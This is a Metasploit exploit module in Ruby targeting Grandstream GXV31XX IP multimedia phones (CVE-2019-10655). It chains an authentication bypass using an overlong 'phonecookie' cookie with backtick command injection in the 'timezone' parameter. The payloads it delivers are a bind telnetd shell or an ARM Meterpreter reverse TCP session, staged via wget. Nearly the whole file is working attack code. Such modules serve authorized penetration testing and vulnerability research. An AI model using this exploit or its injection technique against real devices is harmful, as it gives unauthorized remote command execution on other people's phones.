##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Deprecated

  moved_from 'exploit/linux/http/grandstream_gxv3175_settimezone_unauth_cmd_exec'

  HttpFingerprint = { pattern: [ /Multimedia Phone/ ] }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => "Grandstream GXV31XX 'settimezone' Unauthenticated Command Execution",
        'Description' => %q{
          This module exploits a command injection vulnerability in Grandstream GXV31XX
          IP multimedia phones. The 'settimezone' action does not validate input in the
          'timezone' parameter allowing injection of arbitrary commands.

          A buffer overflow in the 'phonecookie' cookie parsing allows authentication
          to be bypassed by providing an alphanumeric cookie 93 characters in length.

          This module was tested successfully on Grandstream models:
          GXV3175v2 hardware revision V2.6A with firmware version 1.0.1.19; and
          GXV3140 hardware revision V0.4B with firmware version 1.0.1.27.
        },
        'Author' => [
          'alhazred', # Command injection vulnerability discovery and exploit
          'Brendan Scarvell', # Auth bypass discovery
          'bcoles' # Metasploit
        ],
        'License' => MSF_LICENSE,
        'Platform' => %w[unix linux],
        'References' => [
          [ 'CVE', '2019-10655' ],
          [ 'URL', 'https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=23920' ],
          [ 'URL', 'https://github.com/dirtyfilthy/gxv3175-remote-code-exec/blob/master/modules/exploits/linux/http/grandstream_gxv3175_cmd_exec.rb' ]
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        },
        'DisclosureDate' => '2016-09-01',
        'Privileged' => true,
        'CmdStagerFlavor' => %w[wget],
        'Targets' => [
          [
            'Linux (cmd)', {
              'Arch' => ARCH_CMD,
              'Platform' => 'unix',
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/bind_busybox_telnetd'
              }
            }
          ],
          [
            'Linux (ARMLE)', {
              'Arch' => ARCH_ARMLE,
              'Platform' => 'linux',
              'DefaultOptions' => {
                'PrependFork' => true,
                'MeterpreterTryToFork' => true,
                'PAYLOAD' => 'linux/armle/meterpreter_reverse_tcp',
                'CMDSTAGER::FLAVOR' => 'wget'
              }
            }
          ],
        ],
        'DefaultTarget' => 0
      )
    )
  end

  def send_manager_request(vars_get)
    send_request_cgi(
      'uri' => '/manager',
      'cookie' => "phonecookie=\"#{rand_text_alpha(93)}\"",
      'vars_get' => vars_get
    )
  end

  def check
    res = send_manager_request(
      'action' => 'settimezone',
      'timezone' => ''
    )

    if res && res.code == 200 && res.body.to_s.include?('Response=Success')
      return CheckCode::Detected('phonecookie authentication bypassed successfully.')
    end

    CheckCode::Safe
  end

  def execute_command(cmd, _opts = {})
    res = send_manager_request(
      'action' => 'settimezone',
      'timezone' => "`#{cmd}`"
    )
    unless res
      fail_with(Failure::Unreachable, 'Connection failed')
    end
    unless res.code == 200
      fail_with(Failure::UnexpectedReply, "Unexpected reply (HTTP #{res.code})")
    end
    unless res.body.to_s.include?('Response=Success')
      fail_with(Failure::UnexpectedReply, "Unexpected reply (#{res.body.length} bytes)")
    end
  end

  def exploit
    if target.arch.first == ARCH_CMD
      execute_command(payload.encoded)
    else
      execute_cmdstager(
        linemax: 220, # 255 minus URL encoding
        background: true
      )
    end
  end
end
